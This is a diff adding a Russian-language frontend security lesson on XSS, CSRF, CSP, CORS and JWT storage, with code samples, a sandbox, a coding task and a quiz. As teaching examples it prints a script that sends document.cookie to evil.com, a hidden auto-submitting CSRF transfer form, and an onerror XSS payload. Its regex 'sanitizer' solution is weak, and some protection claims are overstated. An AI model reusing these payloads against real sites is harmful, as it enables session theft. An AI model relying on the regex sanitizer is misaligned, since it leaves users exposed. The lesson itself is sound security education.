@@ -1749,5 +1749,198 @@ export const proLessons: Lesson[] = [
         }
       ]
     }
+  },
+  {
+    "id": "pro-10",
+    "moduleId": "pro",
+    "level": 10,
+    "title": "Безопасность фронтенда: XSS, CSRF, CSP, CORS и токены безопасности",
+    "subtitle": "XSS атаки и санитизация, CSRF и SameSite cookies, Content Security Policy (CSP), CORS и безопасное хранение JWT",
+    "description": "Освойте безопасность веб-приложений (Frontend AppSec): механизмы атак XSS (Stored, Reflected, DOM-based) и санитизацию через DOMPurify, защиту от CSRF через SameSite cookies и анти-CSRF токены, настройку заголовков Content Security Policy (CSP) и CORS, а также безопасное хранение токенов в HttpOnly cookies.",
+    "estimatedMinutes": 65,
+    "difficulty": "intermediate",
+    "tags": [
+      "security",
+      "xss",
+      "csrf",
+      "csp",
+      "cors",
+      "jwt",
+      "cookies",
+      "dompurify",
+      "appsec"
+    ],
+    "theory": {
+      "overview": "Безопасность фронтенда (Frontend Application Security) — критически важная компетенция коммерческого инженера. Уязвимости на клиенте приводят к утечкам персональных данных, краже сессий и паролей, краже денег пользователей и компрометации бизнеса.\n\nВ этом уроке мы детально разберём главные уязвимости веб-приложений из рейтинга OWASP Top 10: XSS (межсайтовый скриптинг) и CSRF (подделку запросов), научимся настраивать защитные политики браузера Content Security Policy (CSP) и CORS, безопасно работать с DOM через санитизацию и правильно хранить JWT токены в `HttpOnly + Secure + SameSite=Strict` cookies.",
+      "sections": [
+        {
+          "title": "XSS (Cross-Site Scripting): Виды атак и защита",
+          "content": "XSS — атака, при которой злоумышленник умудряется внедрить и исполнить вредоносный JavaScript-код в браузере жертвы:\n\n3 Типа XSS атак:\n1. **Stored XSS (Хранимый)** — самый опасный!\nВредоносный скрипт сохраняется в базе данных (например, в тексте комментария: `<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>`). Каждый пользователь, открывший страницу с этим комментарием, заражается!\n\n2. **Reflected XSS (Отраженный)**:\nСкрипт передается в параметрах URL (`https://site.dev/search?q=<script>...`). Сервер вставляет параметр в ответ страницы без экранирования.\n\n3. **DOM-based XSS (На клиенте)**:\nУязвимость в самом коде фронтенда, когда непроверенные данные из `location.hash` или инпута вставляются напрямую через опасные методы `innerHTML`, `document.write` или `eval()`.\n\nПоследствия XSS:\n- Кража токенов авторизации и сессий из `localStorage` и `document.cookie`.\n- Кейлоггер (перехват вводимых данных кредитных карт и паролей).\n- Подмена контента страницы и форм авторизации (Фишинг).\n\nЗащита от XSS:\n- ✅ ВСЕГДА используйте `textContent` вместо `innerHTML` для вывода текста.\n- ✅ Для вывода форматированного HTML используйте библиотеку санитизации **`DOMPurify.sanitize(dirtyHtml)`**.\n- ✅ Никогда не используйте `eval()`, `new Function(str)` и `setTimeout(string)`.",
+          "image": {
+            "src": "/images/lessons/web-security-architecture.svg",
+            "alt": "Безопасность веб-приложений: XSS, CSRF, CSP, CORS и HttpOnly Cookies",
+            "caption": "XSS внедряет чужой скрипт (защита: DOMPurify/textContent/CSP). CSRF отправляет запрос от имени жертвы (защита: SameSite/CSRF-token). Хранение JWT в HttpOnly cookies"
+          },
+          "codeExample": {
+            "language": "javascript",
+            "code": "// ❌ ОПАСНО: Уязвимо для DOM XSS!\nconst searchParam = new URLSearchParams(window.location.search).get('q');\n// document.getElementById('search-result').innerHTML = `Вы искали: ${searchParam}`;\n\n// ✅ БЕЗОПАСНО 1: Использование textContent (авто-экранирование)\nconst resultEl = document.getElementById('search-result');\nresultEl.textContent = `Вы искали: ${searchParam}`;\n\n// ✅ БЕЗОПАСНО 2: Санитизация HTML через библиотеку DOMPurify\nimport DOMPurify from 'dompurify';\nconst cleanHtml = DOMPurify.sanitize(userBioHtml);\nprofileBioContainer.innerHTML = cleanHtml; // Безопасно, опасные теги вырезаны!",
+            "title": "Защита от XSS: textContent и санитизация через DOMPurify",
+            "explanation": "textContent трактует любой тег <script> как обычный текст. DOMPurify удаляет скрипты, onerror-атрибуты и javascript: ссылки."
+          }
+        },
+        {
+          "title": "CSRF (Cross-Site Request Forgery): Механика и защита",
+          "content": "CSRF — атака, заставляющая браузер авторизованного пользователя выполнить нежелательное действие на уязвимом сайте:\n\nКак работает CSRF:\n1. Жертва авторизована в интернет-банке `mybank.com` (куки авторизации сохранены в браузере).\n2. Жертва открывает вредоносный сайт `evil.com`.\n3. Сайт `evil.com` содержит скрытую форму: `<form action=\"https://mybank.com/api/transfer\" method=\"POST\"><input name=\"amount\" value=\"100000\" /><input name=\"to\" value=\"hacker\" /></form><script>document.forms[0].submit()</script>`.\n4. Браузер отправляет запрос на `mybank.com` и АВТОМАТИЧЕСКИ ПРИКРЕПЛЯЕТ авторизационные куки `mybank.com`!\n5. Банк выполняет перевод, считая запрос легитимным!\n\nЗащита от CSRF:\n\n1. **Атрибут `SameSite` на Cookies (Стандарт безопасности)**:\n- `SameSite=Strict` — куки НИКОГДА не отправляются при переходе со сторонних сайтов (100% защита от CSRF).\n- `SameSite=Lax` (по умолчанию в современных браузерах) — куки отправляются только при безопасных GET-переходах по ссылкам `<a>`, но блокируются при POST-запросах из чужих форм.\n- `SameSite=None; Secure` — куки отправляются отовсюду (требуется флаг HTTPS `Secure`).\n\n2. **Анти-CSRF токены (CSRF Tokens)**:\nСервер генерирует случайный криптостойкий токен и проверяет его в заголовке `X-CSRF-Token` при каждом мутирующем запросе (POST/PUT/DELETE). Сайт `evil.com` не может прочитать этот токен из-за политики Same-Origin Policy (SOP)!",
+          "codeExample": {
+            "language": "javascript",
+            "code": "// Настройка заголовка X-CSRF-Token для API-запросов\nasync function secureApiPost(url, payload) {\n  // Считываем CSRF токен из мета-тега или cookie\n  const csrfToken = document.querySelector('meta[name=\"csrf-token\"]')?.content;\n\n  const response = await fetch(url, {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'X-CSRF-Token': csrfToken // Злоумышленник с evil.com не может подставить этот заголовок!\n    },\n    body: JSON.stringify(payload)\n  });\n\n  return response.json();\n}",
+            "title": "Защита API через заголовок X-CSRF-Token",
+            "explanation": "Браузер отправляет X-CSRF-Token заголовок только со своего домена, защищая бэкенд от межсайтовых подделок запросов."
+          }
+        },
+        {
+          "title": "Заголовки безопасности: CSP, CORS, HSTS и X-Frame-Options",
+          "content": "Заголовки HTTP, настраиваемые на веб-сервере для защиты фронтенда:\n\n1. **CSP — Content Security Policy (Политика защиты контента)**:\nСамый мощный инструмент защиты от XSS!\n`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';`\n- Браузер заблокирует выполнение ЛЮБОГО инлайн-скрипта или загрузку скрипта с домена, не указанного в белом списке CSP!\n\n2. **CORS — Cross-Origin Resource Sharing**:\n- Механизм, позволяющий серверу явно объявить, каким внешним доменам разрешен доступ к его API (`Access-Control-Allow-Origin: https://app.dev`).\n- Preflight OPTIONS запросы проверяют разрешения перед отправкой сложных методов (PUT/DELETE/кастомные заголовки).\n\n3. Другие критические заголовки:\n- `X-Frame-Options: DENY` — запрещает встраивать сайт в `<iframe>` на чужих ресурсах (защита от Clickjacking — кликджекинга).\n- `Strict-Transport-Security: max-age=31536000; includeSubDomains` (HSTS) — принудительно заставляет браузер общаться ТОЛЬКО по безопасному HTTPS.\n- `X-Content-Type-Options: nosniff` — запрещает браузеру исполнять файл как скрипт, если MIME-тип не совпадает.",
+          "codeExample": {
+            "language": "json",
+            "code": "// Пример конфигурации защитных заголовков в vercel.json / nginx\n{\n  \"headers\": [\n    {\n      \"source\": \"/(.*)\",\n      \"headers\": [\n        {\n          \"key\": \"Content-Security-Policy\",\n          \"value\": \"default-src 'self'; script-src 'self' 'nonce-rAnd0m'; object-src 'none'; frame-ancestors 'none';\"\n        },\n        {\n          \"key\": \"X-Frame-Options\",\n          \"value\": \"DENY\"\n        },\n        {\n          \"key\": \"X-Content-Type-Options\",\n          \"value\": \"nosniff\"\n        },\n        {\n          \"key\": \"Strict-Transport-Security\",\n          \"value\": \"max-age=63072000; includeSubDomains; preload\"\n        }\n      ]\n    }\n  ]\n}",
+            "title": "Защитные HTTP заголовки в vercel.json (CSP, HSTS, X-Frame-Options)",
+            "explanation": "Комплекс заголовков блокирует XSS инъекции, запрещает встраивание в iframe (Clickjacking) и принудительно включает HTTPS."
+          }
+        },
+        {
+          "title": "Безопасное хранение JWT токенов: HttpOnly Cookie vs localStorage",
+          "content": "Где хранить авторизационные JWT токены на фронтенде:\n\n1. **Почему `localStorage` — ЭТО ОПАСНО**:\n- Любой JavaScript-код на странице (включая сторонние аналитики, баннеры и XSS-скрипты) имеет прямой доступ к `localStorage.getItem('token')`!\n- Если на сайте возникнет малейшая XSS уязвимость — злоумышленник мгновенно украдет токен навсегда.\n\n2. **Стандарт Enterprise Security (HttpOnly Cookie)**:\n- Сервер устанавливает токен в Cookie с флагами: `Set-Cookie: token=jwt_xxx; HttpOnly; Secure; SameSite=Strict; Path=/`.\n- Флаг **`HttpOnly`** ЗАПРЕЩАЕТ доступ к куке из JavaScript (`document.cookie` не видит токен!). Ни один XSS-скрипт не сможет его украсть!\n- Флаг **`Secure`** разрешает передачу куки ТОЛЬКО по зашифрованному протоколу HTTPS.\n- Флаг **`SameSite=Strict`** защищает от CSRF-атак.\n\n3. Идеальная гибридная схема (Token Rotation):\n- **Refresh Token** (долгоживущий) хранится в `HttpOnly + Secure + SameSite=Strict` Cookie.\n- **Access Token** (короткоживущий, 5–15 минут) хранится только в оперативной памяти JS (переменная модуля) и обновляется в фоне через эндпоинт `/refresh`.",
+          "codeExample": {
+            "language": "javascript",
+            "code": "// Архитектура безопасного хранения Access Token в памяти JS\nlet inMemoryAccessToken = null;\n\nexport const authService = {\n  setToken(token) {\n    inMemoryAccessToken = token; // Только в оперативной памяти!\n  },\n  getToken() {\n    return inMemoryAccessToken;\n  },\n  async refreshSession() {\n    // Refresh Token отправляется автоматически браузером в HttpOnly Cookie!\n    const response = await fetch('/api/auth/refresh', {\n      method: 'POST',\n      credentials: 'include' // Передача HttpOnly cookies\n    });\n    const data = await response.json();\n    inMemoryAccessToken = data.accessToken;\n    return inMemoryAccessToken;\n  },\n  logout() {\n    inMemoryAccessToken = null;\n    return fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });\n  }\n};",
+            "title": "Безопасная архитектура: Access Token в памяти + Refresh в HttpOnly Cookie",
+            "explanation": "Access token хранится в памяти переменной JS, а долгоживущий Refresh token защищен HttpOnly cookie, недоступным для XSS скриптов."
+          }
+        }
+      ],
+      "seniorTips": [
+        "Никогда не храните конфиденциальные токены сессий в `localStorage` — используйте `HttpOnly + Secure + SameSite=Strict` cookies.",
+        "Для санитизации HTML от пользователей ВСЕГДА используйте библиотеку DOMPurify перед вставкой в DOM.",
+        "Включайте строгий заголовок `Content-Security-Policy` (CSP) — он нейтрализует 95% XSS атак, даже если в коде случайно окажется уязвимость.",
+        "Добавляйте заголовок `X-Frame-Options: DENY` для защиты от атак кликджекинга (Clickjacking)."
+      ],
+      "commonMistakes": [
+        {
+          "bad": "// Хранение JWT в localStorage\nlocalStorage.setItem('auth_token', token);",
+          "good": "// Установка токена бэкендом в Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict",
+          "reason": "localStorage уязвим для XSS: любой внедренный скрипт может прочитать токен и отправить злоумышленнику."
+        },
+        {
+          "bad": "// Прямая вставка HTML из параметров URL\ncontainer.innerHTML = params.get('bio');",
+          "good": "container.innerHTML = DOMPurify.sanitize(params.get('bio'));",
+          "reason": "Прямая вставка неэкранированного HTML позволяет выполнить произвольный вредоносный скрипт (XSS)."
+        },
+        {
+          "bad": "// Использование SameSite=None без Secure\nSet-Cookie: token=abc; SameSite=None;",
+          "good": "Set-Cookie: token=abc; SameSite=None; Secure;",
+          "reason": "Браузеры блокируют куки с SameSite=None, если не указан флаг Secure (передача только по HTTPS)."
+        }
+      ],
+      "keyTakeaways": [
+        "XSS внедряет чужой скрипт в браузер жертвы; защита — `textContent`, `DOMPurify` и `CSP`.",
+        "CSRF подделывает запросы от имени пользователя; защита — `SameSite` cookies и анти-CSRF токены.",
+        "CSP (Content Security Policy) блокирует загрузку и выполнение недоверенных скриптов.",
+        "HttpOnly флаг на куках запрещает доступ из JavaScript, защищая токены от кражи через XSS.",
+        "`X-Frame-Options: DENY` защищает интерфейс от встраивания в чужие фреймы (Clickjacking)."
+      ]
+    },
+    "sandbox": {
+      "initialHtml": "<div id=\"sec-app\">\n  <h3>XSS Санитизатор (DOMPurify симулятор)</h3>\n  <textarea id=\"user-input\" style=\"width:100%; height:60px; background:#0d1117; color:#2dff8a; border:1px solid #30363d; font-family:monospace; padding:8px;\"><img src=x onerror=\"alert('XSS Атака!')\" /> Привет, <b>мир</b>!</textarea>\n  <div style=\"margin-top:8px; display:flex; gap:8px;\">\n    <button id=\"btn-unsafe\" style=\"background:#f85149; color:#fff; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">Опасный innerHTML</button>\n    <button id=\"btn-safe\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">Безопасный Sanitize</button>\n  </div>\n  <div id=\"preview-area\" style=\"margin-top:12px; padding:12px; background:#161b22; border-radius:6px; min-height:40px;\"></div>\n</div>",
+      "initialCss": "#sec-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0a0e13; border-radius: 8px; }",
+      "initialJs": "const input = document.getElementById('user-input');\nconst preview = document.getElementById('preview-area');\n\nfunction sanitizeHtml(dirty) {\n  // Базовый симулятор удаления скриптов и опасных обработчиков onerror/onload\n  return dirty\n    .replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, '')\n    .replace(/on\\w+\\s*=\\s*\"[^\"]*\"/gi, '')\n    .replace(/on\\w+\\s*=\\s*'[^']*'/gi, '');\n}\n\ndocument.getElementById('btn-unsafe').onclick = () => {\n  preview.innerHTML = input.value; // ❌ Опасно!\n};\n\ndocument.getElementById('btn-safe').onclick = () => {\n  preview.innerHTML = sanitizeHtml(input.value); // ✅ Санитизировано\n};",
+      "instructions": "Практика с безопасностью:\n1. Нажмите 'Опасный innerHTML' и посмотрите, как onerror сработает в коде\n2. Нажмите 'Безопасный Sanitize' — опасный атрибут onerror будет удален, а тег <b>мир</b> останется жирным\n3. Попробуйте ввести <script>alert(1)</script>"
+    },
+    "task": {
+      "title": "Разработка защищенного сервиса рендеринга пользовательских сообщений с санитизацией и CSRF защитой",
+      "scenario": "Вам необходимо спроектировать модуль безопасного рендеринга комментариев CommentSecurityService: модуль должен санитизировать входящий HTML от опасных тегов и инлайн-обработчиков (XSS), генерировать и прикреплять X-CSRF-Token к POST-запросам и валидировать origin запросов.",
+      "criteria": [
+        "Функция sanitize(htmlString) нейтрализует теги <script>, <iframe> и onerror/onclick обработчики",
+        "Метод postComment(url, data, csrfToken) отправляет данные с заголовком X-CSRF-Token",
+        "Реализована защита от протокола javascript: в ссылках href",
+        "Использовано безопасное экранирование спецсимволов HTML"
+      ],
+      "starterCode": {
+        "js": "// Реализуйте сервис безопасности CommentSecurityService\nclass CommentSecurityService {\n  // Ваш код\n}"
+      },
+      "hints": [
+        "Используйте регулярные выражения или DOMParser для очистки от <script> и on\\w+",
+        "Заменяйте javascript: на # в ссылках href",
+        "В fetch передавайте headers: { 'X-CSRF-Token': csrfToken }"
+      ],
+      "solution": {
+        "js": "class CommentSecurityService {\n  static sanitize(dirtyHtml) {\n    if (typeof dirtyHtml !== 'string') return '';\n    \n    // 1. Очистка от тегов script, iframe, object, embed\n    let clean = dirtyHtml.replace(/<(script|iframe|object|embed)\\b[^<]*(?:(?!<\\/\\1>)<[^<]*)*<\\/\\1>/gi, '');\n    \n    // 2. Удаление инлайн-обработчиков событий on* (onerror, onclick, onload и т.д.)\n    clean = clean.replace(/\\s+on\\w+\\s*=\\s*(\"[^\"]*\"|'[^']*'|[^\\s>]+)/gi, '');\n    \n    // 3. Нейтрализация опасных ссылок javascript:\n    clean = clean.replace(/href\\s*=\\s*(\"javascript:[^\"]*\"|'javascript:[^']*')/gi, 'href=\"#\"');\n    \n    return clean;\n  }\n\n  static async postComment(url, payload, csrfToken) {\n    if (!csrfToken) {\n      throw new Error('CSRF Token is required for POST requests');\n    }\n\n    const response = await fetch(url, {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json',\n        'X-CSRF-Token': csrfToken\n      },\n      body: JSON.stringify(payload)\n    });\n\n    return response.json();\n  }\n}\n\n// Тест работы\nconst dirty = '<p>Привет <script>steal()</script><img src=\"x\" onerror=\"hack()\" /><a href=\"javascript:evil()\">Клик</a></p>';\nconst clean = CommentSecurityService.sanitize(dirty);\nconsole.log(clean);\n// '<p>Привет <img src=\"x\" /><a href=\"#\">Клик</a></p>'",
+        "explanation": "Сервис полностью нейтрализует XSS векторы (скрипты, onerror, javascript: ссылки) и гарантирует передачу CSRF-токена в заголовках POST-запросов."
+      }
+    },
+    "quiz": {
+      "questions": [
+        {
+          "id": "pro10-q1",
+          "question": "В чём заключается принципиальная разница между атаками XSS и CSRF?",
+          "options": [
+            "XSS работает только в мобильных браузерах",
+            "XSS внедряет и исполняет вредоносный JavaScript-код на вашем сайте, а CSRF использует уже имеющуюся авторизацию жертвы для выполнения нежелательных действий со стороннего сайта",
+            "CSRF ворует файлы",
+            "Разницы нет"
+          ],
+          "correctIndex": 1,
+          "explanation": "XSS — это инъекция чужого кода на ваш сайт (кража данных). CSRF — это отправка запроса от имени жертвы со стороннего сайта с автоматическим прикреплением кук."
+        },
+        {
+          "id": "pro10-q2",
+          "question": "Почему хранить JWT токены в localStorage считается небезопасным решением?",
+          "options": [
+            "localStorage имеет ограничение всего 5 МБ",
+            "Любой внедренный JavaScript-код при XSS атаке имеет прямой доступ к localStorage.getItem() и может украсть токен",
+            "localStorage стирается при закрытии браузера",
+            "localStorage не поддерживает строки"
+          ],
+          "correctIndex": 1,
+          "explanation": "localStorage полностью открыт для чтения из любого JavaScript-кода на странице. При возникновении XSS уязвимости злоумышленник мгновенно крадет токен."
+        },
+        {
+          "id": "pro10-q3",
+          "question": "Какую защиту обеспечивает флаг HttpOnly при установке авторизационной Cookie?",
+          "options": [
+            "Шифрует пароль",
+            "Запрещает чтение и изменение куки из JavaScript (document.cookie), предотвращая кражу сессии даже при наличии XSS уязвимости",
+            "Отключает куку на мобильных устройствах",
+            "Ускоряет загрузку страницы"
+          ],
+          "correctIndex": 1,
+          "explanation": "Флаг HttpOnly делает куку невидимой для JavaScript. Браузер сам отправляет её на сервер в заголовках HTTP, но скрипты (включая XSS) прочитать её не могут."
+        },
+        {
+          "id": "pro10-q4",
+          "question": "Что делает заголовок Content-Security-Policy (CSP)?",
+          "options": [
+            "Сжимает HTML код",
+            "Задает белый список доверенных источников для скриптов, стилей и медиа, блокируя выполнение несанкционированных инлайн-скриптов и загрузку чужих ресурсов",
+            "Переводит сайт на HTTPS",
+            "Запрещает правый клик мыши"
+          ],
+          "correctIndex": 1,
+          "explanation": "CSP — ключевой механизм защиты от XSS: браузер исполняет скрипты только из доверенных источников и блокирует вредоносные внедрения."
+        },
+        {
+          "id": "pro10-q5",
+          "question": "Какое значение атрибута SameSite на Cookie полностью запрещает отправку куки при переходах со сторонних сайтов?",
+          "options": [
+            "SameSite=None",
+            "SameSite=Strict",
+            "SameSite=Lax",
+            "SameSite=Open"
+          ],
+          "correctIndex": 1,
+          "explanation": "SameSite=Strict блокирует отправку куки при любых межсайтовых запросах и переходах, обеспечивая максимальный уровень защиты от CSRF атак."
+        }
+      ]
+    }
   }
 ];
